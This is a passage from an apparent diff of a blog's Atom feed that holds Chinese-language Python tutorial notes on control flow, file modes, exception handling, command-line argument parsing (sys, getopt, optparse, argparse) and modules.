-&lt;h3 id=&#34;选择结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#选择结构&#34;&gt;#&lt;/a&gt; 选择结构&lt;/h3&gt;
-&lt;p&gt;说白了也就是 if 语句，比如说判断成绩小于 60 为不及格，高于 90 为优秀可以使用下面的代码实现&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129215827705.png&#34; alt=&#34;image-20230129215827705&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里记得要注意，input 默认是 str 类型&lt;/p&gt;
-&lt;h3 id=&#34;循环结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#循环结构&#34;&gt;#&lt;/a&gt; 循环结构&lt;/h3&gt;
-&lt;p&gt;在 python 中有两种循环结构，分别为 for 循环和 while 循环，for 循环主要使用在有明显边界范围的情况，而 while 主要使用在范围不能确定的情况&lt;/p&gt;
-&lt;h4 id=&#34;for循环&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#for循环&#34;&gt;#&lt;/a&gt; for 循环&lt;/h4&gt;
-&lt;p&gt;上面提到，边界明确和固定，比如，计算 1 加到 100&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129221950576.png&#34; alt=&#34;image-20230129221950576&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;while循环&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#while循环&#34;&gt;#&lt;/a&gt; while 循环&lt;/h4&gt;
-&lt;p&gt;当无边界时，常使用的循环结构，比如 1 加到 x&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230129222336287.png&#34; alt=&#34;image-20230129222336287&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;文件异常处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件异常处理&#34;&gt;#&lt;/a&gt; 文件 &amp;amp; 异常处理&lt;/h2&gt;
-&lt;h3 id=&#34;文件处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件处理&#34;&gt;#&lt;/a&gt; 文件处理&lt;/h3&gt;
-&lt;p&gt;文件是以硬盘为载体存储在计算机上的信息集合，有数据库文件，图像文件，音频，视频，文本文件等等&lt;/p&gt;
-&lt;p&gt;这里的文件操纵主要是对文本文件进行一个操作，对于文本文件来说，文件操作的基本流程分为三个：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;打开文件并创建对象&lt;/li&gt;
-&lt;li&gt;对文件内容进行增删改查&lt;/li&gt;
-&lt;li&gt;关闭文件&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;创建文件对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建文件对象&#34;&gt;#&lt;/a&gt; 创建文件对象&lt;/h4&gt;
-&lt;p&gt;在 python 中内置了文件对象，通过 open 函数可以制定模式打开指定文件并创建文件对象&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;open(name[, mode[, buffering[,encoding=[]]]])
-&lt;/code&gt;&lt;/pre&gt;
-&lt;ul&gt;
-&lt;li&gt;name : 一个包含了你要访问的文件名称的字符串值。&lt;/li&gt;
-&lt;li&gt;mode : mode 决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读 (r)。&lt;/li&gt;
-&lt;li&gt;buffering : 如果 buffering 的值被设为 0，就不会有寄存。如果 buffering 的值取 1，访问文件时会寄存行。如果将 buffering 的值设为大于 1 的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。&lt;/li&gt;
-&lt;li&gt;encoding: 指定文本的编码模式&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;下表是 mode 的参数和对应的模式&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;模式&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;t&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;文本模式 (默认)。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;x&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;写模式，新建一个文件，如果该文件已存在则会报错。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;b&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;二进制模式。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件进行更新 (可读可写)。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;U&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;通用换行模式（不推荐）。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;r&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;rb&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;r+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于读写。文件指针将会放在文件的开头。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;rb+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;w&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;wb&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;w+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;wb+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;a&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;ab&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;a+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;ab+&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h4 id=&#34;文件的读取&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件的读取&#34;&gt;#&lt;/a&gt; 文件的读取&lt;/h4&gt;
-&lt;p&gt;通常对文件的操作包括文件的读取，写入，追加，二进制模式，文本模式，读写模式&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;读取文件的内容&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;r&lt;/code&gt; ：读模式（默认可以省略），如果文件不存在会抛出异常&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;+&lt;/code&gt; ：读、写模式（可以同其他模式组合使用）&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;readable()&lt;/code&gt; : 测试文本文件是否可读（能写则返回 Ture）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091321388.png&#34; alt=&#34;image-20230131091321388&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;read(size)&lt;/code&gt; ：读取文件中的 size 字符，如省略则读取全部字符&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091750676.png&#34; alt=&#34;image-20230131091750676&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;如果有&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131091925769.png&#34; alt=&#34;image-20230131091925769&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;readline()&lt;/code&gt; : 读取文件的第一行作为结果返回&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092244773.png&#34; alt=&#34;image-20230131092244773&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;readlines()&lt;/code&gt; ：会将文件的每一行作为一个字符串，存入列表返回&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092419709.png&#34; alt=&#34;image-20230131092419709&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;也可以使用 for 循环读取文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131092552484.png&#34; alt=&#34;image-20230131092552484&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;文件的写入&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;w&lt;/code&gt; ：写入模式，会清空文件原有内容，如果文件不存在会创建文件&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;x&lt;/code&gt; ：写入模式，如果文件已经存在则抛出异常&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;a&lt;/code&gt; ：追加模式，不覆盖原有内容&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;writable()&lt;/code&gt; ：测试文件是否可写&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131093011707.png&#34; alt=&#34;image-20230131093011707&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;write(str)&lt;/code&gt; ：将 str 写入文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131093615623.png&#34; alt=&#34;image-20230131093615623&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;文件关闭&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件关闭&#34;&gt;#&lt;/a&gt; 文件关闭&lt;/h4&gt;
-&lt;p&gt;使用 close () 函数关闭文件，文件对象会被删除，使得所作的修改保存到文件中，在文件操作中出现了异常很难保证文件正常关闭，这里可以使用 with 关键字&lt;/p&gt;
-&lt;h3 id=&#34;异常处理结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#异常处理结构&#34;&gt;#&lt;/a&gt; 异常处理结构&lt;/h3&gt;
-&lt;p&gt;对于一种高级语言来说，异常处理可以提高文件的健壮性和容错性，使得代码不会因为使用者的错误使用导致系统崩溃，同时可以为使用者提供一些错误提示，异常处理的思路是先进行再处理可能出现的错误&lt;/p&gt;
-&lt;h4 id=&#34;tryexcept结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tryexcept结构&#34;&gt;#&lt;/a&gt; try...except... 结构&lt;/h4&gt;
-&lt;p&gt;在 python 的异常处理结构中，这是使用最为频繁的一种结构，当 try 子句代码块执行异常，并且被 except 子句捕获，则执行 except 子句代码块&lt;/p&gt;
-&lt;p&gt;例：学校在录入成绩要求成绩为 0-150 的整数，而不接受其他数据类型&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131101411225.png&#34; alt=&#34;image-20230131101411225&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;tryexceptelse结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tryexceptelse结构&#34;&gt;#&lt;/a&gt; try...except..else.. 结构&lt;/h4&gt;
-&lt;p&gt;还是上面的例子，这里的 else 是 except 的否定执行体&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131102111632.png&#34; alt=&#34;image-20230131102111632&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;tryexceptfinally&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tryexceptfinally&#34;&gt;#&lt;/a&gt; try...except...finally&lt;/h4&gt;
-&lt;p&gt;与上面的区别就是，无论 try 子代码块能否正常执行，finally 中的代码都会正常执行&lt;/p&gt;
-&lt;p&gt;例：输入两个数进行除法运算，输出最后结构&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131103141816.png&#34; alt=&#34;image-20230131103141816&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;命令行参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令行参数&#34;&gt;#&lt;/a&gt; 命令行参数&lt;/h2&gt;
-&lt;p&gt;常见的服务器都是 Linux 系统，并且多数都是无图形化界面的，进行任何的操作都是通过命令行的方式进行，这一块主要是借助 python 提供的几种主流的参数解析工具来实现简单的功能&lt;/p&gt;
-&lt;p&gt;Python 中的三个内建模块用于处理命令行参数&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;sys&lt;/li&gt;
-&lt;li&gt;getopt&lt;/li&gt;
-&lt;li&gt;optparse&lt;/li&gt;
-&lt;li&gt;argparse&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;sys命令行参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sys命令行参数&#34;&gt;#&lt;/a&gt; sys 命令行参数&lt;/h3&gt;
-&lt;p&gt;sys 模块主要用于获取和 Python 解释器相关的信息，可以在 python 交互式解释器中导入 sys 模块，通过内置函数 dir 查询到模块内定义的所有名称，并以一个字符串列表的形式返回&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131110838698.png&#34; alt=&#34;image-20230131110838698&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;sysargv&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sysargv&#34;&gt;#&lt;/a&gt; sys.argv&lt;/h4&gt;
-&lt;p&gt;以列表的方式获取 python 程序运行的命令行参数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131113706097.png&#34; alt=&#34;image-20230131113706097&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;getopt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#getopt&#34;&gt;#&lt;/a&gt; getopt&lt;/h4&gt;
-&lt;p&gt;getopt 是对 sys.argv 获取的命令行参数进行二次处理，在运行程序时可能需要根据不通的条件，输入不通的命令行选项来实现不通的功能，例如 - u 后面是用户，-p 后面是密码&lt;/p&gt;
-&lt;p&gt;使用 getopt.getopt () 会返回两个列表，一个赋值给 opts 一个赋值给 args&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;opts：是（选项，选项值）的元组为一个元素列表，如果没有选项值为空字符串&lt;/li&gt;
-&lt;li&gt;args：存放没用选项单参数的列表，不属于格式信息的剩余的命令行参数&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131120822875.png&#34; alt=&#34;image-20230131120822875&#34; /&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;使用 sys.argv [1:] 是为了过滤第一个参数&lt;/li&gt;
-&lt;li&gt;“u:p” 为定义短格式选项（-），这里的 h 和 u 为两个选项，“h” 后面没有 “:” 表示 h 这个选项没有选项值，而 u 必须有选项值&lt;/li&gt;
-&lt;li&gt;[&amp;quot;help&amp;quot;,&amp;quot;file=&amp;quot;] 为定义长格式选项（--），这里 “=” 和上面的短格式选项中的 “:” 一样&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;optparse&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#optparse&#34;&gt;#&lt;/a&gt; optparse&lt;/h4&gt;
-&lt;p&gt;主要用于为脚本传递命令参数，采用预先定义好的选项来解析命令行参数，与 getopt 函数不通的是 optparse 可以自动生成帮助信息&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import optparse
-
-usage=&amp;quot;python&amp;quot;
-parser=optparse.OptionParser(usage)
-parser.add_option(&#39;-u&#39;,&#39;--user&#39;,dest=&#39;User&#39;,type=&#39;string&#39;,help=&#39;target user&#39;,default=&#39;root&#39;)
-parser.add_option(&#39;-p&#39;,&#39;--password&#39;,dest=&#39;Pwd&#39;,type=&#39;string&#39;,help=&#39;target password&#39;)
-options,args=parser.parse_args()
-
-print(&amp;quot;option为：&amp;quot;,options)
-print(&amp;quot;用户名为：&amp;quot;,options.User)
-print(&amp;quot;密码为：&amp;quot;,options.Pwd)
-print(&amp;quot;args为：&amp;quot;,args)
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131152430672.png&#34; alt=&#34;image-20230131152430672&#34; /&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;可以设置多个选项字符串，比如上面的 “-u’，--user’这两个，用的时候任选其一；&lt;/li&gt;
-&lt;li&gt;dest - 用于定义选项值存放的位置，作为后面的第一个字典 (options) 的键，值为命令输入的参数:&lt;/li&gt;
-&lt;li&gt;type 用于检测命令行输入参数的数据类型是否符合要求，有 string、int、float 等类型:&lt;/li&gt;
-&lt;li&gt;help 用于定义帮助信息:&lt;/li&gt;
-&lt;li&gt;default 设置默认值；&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;argparse&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#argparse&#34;&gt;#&lt;/a&gt; argparse&lt;/h4&gt;
-&lt;p&gt;相当于 optparse 的一个完善的版本&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import argparse
-argparse=argparse.ArgumentParser()
-argparse.add_argument(&#39;-u&#39;,&#39;--user&#39;,dest=&#39;User&#39;,type=str,default=&#39;root&#39;,help=&#39;target User&#39;)
-argparse.add_argument(&#39;-s&#39;,&#39;--sex&#39;,dest=&#39;Sex&#39;,type=str,choices=[&#39;男&#39;,&#39;女&#39;],default=&#39;男&#39;,help=&#39;target Sex&#39;)
-argparse.add_argument(&#39;-n&#39;,&#39;--nuaber&#39;,dest=&#39;Nua&#39;,nargs=2,required=True,type=int,help=&#39;target Two Numbers&#39;)
-print(argparse.parse_args())
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131154514101.png&#34; alt=&#34;image-20230131154514101&#34; /&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;可以设置多个选项字符中，比如上面的 “-u’，-user’这两个，用的时候任选其一；&lt;/li&gt;
-&lt;li&gt;type 用于检测命令行输入参数的数据类型是否符合要求，有 string、int、float 等类型；&lt;/li&gt;
-&lt;li&gt;dest - 用于定义选项值存放的位置，作为后面的第一个字典 (options) 的键，值为命令输入的参数&lt;/li&gt;
-&lt;li&gt;help 用于定义帮助信息；&lt;/li&gt;
-&lt;li&gt;default 设贸默认值:&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;模块化编程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模块化编程&#34;&gt;#&lt;/a&gt; 模块化编程&lt;/h2&gt;
-&lt;h3 id=&#34;python的程序结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的程序结构&#34;&gt;#&lt;/a&gt; Python 的程序结构&lt;/h3&gt;
-&lt;p&gt;Python 的程序又包，模块和函数组成&lt;/p&gt;
-&lt;p&gt;三者的关系如下图所示&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131160222870.png&#34; alt=&#34;image-20230131160222870&#34; /&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;包是一个完成特定任务的工具箱&lt;/p&gt;
-&lt;p&gt;可以提高程序的开发效率，减少编程的复杂度，达到代码重用的效果&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;模块是处理某一类问题的集合&lt;/p&gt;
-&lt;p&gt;模块由函数和类构成，没有 main 函数&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;函数是一段可以重用的又名称的代码&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;函数定义调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#函数定义调用&#34;&gt;#&lt;/a&gt; 函数定义 &amp;amp; 调用&lt;/h3&gt;
-&lt;p&gt;格式：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def 函数名(形参表):
-    函数体与序列
-    [retern 表达式] #可选项
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;函数调用：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;函数名(形参表)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;注：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;函数必须先定义再使用&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;函数名与变量名的命名规则相同&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131161725327.png&#34; alt=&#34;image-20230131161725327&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;局部变量全局变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#局部变量全局变量&#34;&gt;#&lt;/a&gt; 局部变量 &amp;amp; 全局变量&lt;/h3&gt;
-&lt;h4 id=&#34;局部变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#局部变量&#34;&gt;#&lt;/a&gt; 局部变量&lt;/h4&gt;
-&lt;ul&gt;
-&lt;li&gt;局部变量是只能在函数或代码块内使用的变量&lt;/li&gt;
-&lt;li&gt;函数或代码段一旦结束，局部变量的生命周期也就结束&lt;/li&gt;
-&lt;li&gt;局部变量的作用范围只在其被创建的函数内有效&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;全局变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#全局变量&#34;&gt;#&lt;/a&gt; 全局变量&lt;/h4&gt;
-&lt;ul&gt;
-&lt;li&gt;全局变量是能够被不同的函数、类或文件共享的变量&lt;/li&gt;
-&lt;li&gt;在函数之外定义的变量都可以称为全局变量&lt;/li&gt;
-&lt;li&gt;全局变量可以被文件内部的任何函数和外部文件访问&lt;/li&gt;
-&lt;li&gt;全局变量通常在文件的开始处定义&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;模块导入方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模块导入方式&#34;&gt;#&lt;/a&gt; 模块导入方式&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;import 语句，导入整个模块&lt;/li&gt;
-&lt;li&gt;from...import... 语句，导入模块的部分属性&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;自定义包和模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义包和模块&#34;&gt;#&lt;/a&gt; 自定义包和模块&lt;/h3&gt;
-&lt;p&gt;Python 程序除了可以直接运行，还可以作为模块导入并使用其中的对象，通过__name__属性可以识别程序的使用方式：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;每个 Python 脚本在运行时都有一个__name__属性，如果脚本作为模板被导入，则其__name__属性的值被自动设置为模块名&lt;/li&gt;
-&lt;li&gt;如果脚本独立运行，则其__name__属性被制动设置为字符串__main__&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;对于大型软件开发，不可能把所有的代码都放到一个文件中，这样会使得代码难以维护和管理，通常使用包来管理。包是 Python 用来组织命名空间和类的重要方法。在包的每个目录中都要包含一个__init__.py 文件，这个文件是一个空文件，用于表示当前文件夹是一个包，设置__all__变量以及执行初始化包所需要的代码&lt;/p&gt;
-</content>
-        <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
-        <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
-        <updated>2023-01-30T16:00:00.000Z</updated>
     </entry>
 </feed>
